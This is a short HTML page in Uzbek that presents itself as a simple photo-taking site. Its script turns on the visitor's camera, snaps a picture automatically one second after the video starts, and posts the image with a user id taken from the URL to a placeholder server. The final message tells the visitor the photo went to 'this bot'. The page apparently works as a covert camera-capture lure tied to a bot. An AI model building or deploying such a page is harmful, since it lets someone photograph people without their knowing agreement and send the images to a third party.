<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Rasm Oluvchi Sayt</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
      background-color: #f0f0f0;
    }
    #camera {
      border: 2px solid #ccc;
      border-radius: 10px;
    }
    #result {
      margin-top: 20px;
      font-size: 18px;
      color: green;
    }
    #captured-image {
      margin-top: 20px;
      border: 2px solid #ccc;
      border-radius: 10px;
      max-width: 100%;
    }
  </style>
</head>
<body>
  <h1>Kamerangiz orqali rasm oling</h1>
  <video id="camera" autoplay></video>
  <img id="captured-image" src="#" alt="Captured Image" style="display: none;">
  <div id="result"></div>

  <script>
    const video = document.getElementById('camera');
    const resultDiv = document.getElementById('result');
    const capturedImage = document.getElementById('captured-image');

    // Kamerani yoqish
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;

        // Video yuklanganida avtomatik rasm olish
        video.addEventListener('play', () => {
          setTimeout(() => {
            capturePhoto();
          }, 1000); // 1 soniya kutib, rasmni oladi
        });
      })
      .catch(err => {
        console.error('Kamera yoqilmadi:', err);
      });

    // Rasmni olish funksiyasi
    function capturePhoto() {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const context = canvas.getContext('2d');
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Rasmni ekranga chiqarish
      const imageUrl = canvas.toDataURL('image/jpeg');
      capturedImage.src = imageUrl;
      capturedImage.style.display = 'block';

      // Rasmni serverga yuborish
      fetch('https://yourserver.com/upload', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          image: imageUrl,
          userId: new URLSearchParams(window.location.search).get('id'), // URL dan userId ni olish
        }),
      })
        .then(response => response.json())
        .then(data => {
          resultDiv.textContent = 'Sizning rasmingiz bu botga jo\'natildi!';
        })
        .catch(error => {
          console.error('Xatolik:', error);
          resultDiv.textContent = 'Rasm yuborishda xatolik yuz berdi.';
        });
    }
  </script>
</body>
</html>
